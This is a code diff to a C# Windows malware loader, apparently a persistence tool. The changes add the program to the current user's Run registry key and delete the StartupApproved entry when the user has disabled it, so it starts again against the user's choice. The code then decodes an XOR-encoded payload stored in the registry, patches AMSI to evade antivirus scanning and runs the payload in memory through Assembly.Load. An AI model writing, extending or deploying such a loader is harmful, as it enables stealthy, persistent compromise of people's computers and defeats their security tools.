@@ -13,6 +13,18 @@ namespace persistence
             string path = @"Software\pres";
             string exePath = Assembly.GetExecutingAssembly().Location;
 
+            string runKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
+            string approvedKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run";
+
+            RegistryKey runKey = null;
+            RegistryKey approvedKey = null;
+
+            runKey = Registry.CurrentUser.OpenSubKey(runKeyPath, true);
+            approvedKey = Registry.CurrentUser.OpenSubKey(approvedKeyPath, true);
+
+            bool existsInRun = runKey?.GetValue("Pres") != null;
+            bool isDisabled = false;
+
             RegistryKey key = Registry.CurrentUser.OpenSubKey(path, true);
 
             if (key == null)
@@ -25,16 +37,25 @@ namespace persistence
 
             }
 
-            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+             if (approvedKey?.GetValue("Pres") is byte[] data && data.Length > 0)
+             {
+                 isDisabled = data[0] == 0x03; 
+             }
 
-            if (runKey == null)
-            {
-                runKey.SetValue("Pres", exePath);
-            }
+             if (!existsInRun)
+             {
+                 runKey?.SetValue("Pres", exePath);
+             }
 
-            runKey.Close();
+             if (isDisabled)
+             {
+                 approvedKey?.DeleteValue("Pres", false);
+             }
 
-            byte xorKey = 41; // XOR key, make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
+             runKey.Close();
+             approvedKey.Close();
+
+            byte xorKey = 41; // XOR key make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
             var parts = key.GetValueNames()
                             .OrderBy(x => x)
                             .Select(x => key.GetValue(x)?.ToString())
@@ -51,15 +72,16 @@ namespace persistence
 
             key.Close();
 
-            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load.
+            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load
             AmsiPatcher patcher = new AmsiPatcher();
             patcher.Initialize();
             patcher.Patch();
 
-            // NOTE: never use Assembly.Load without patching AMSI before.
+            // NOTE: never use Assembly.Load without patching AMSI before 
             Assembly asm = Assembly.Load(encryptedBytes);
             asm.EntryPoint?.Invoke(null, new object[] { new string[0] });
 
+            
             Console.WriteLine("\nDone.");
             Console.ReadLine();
         }
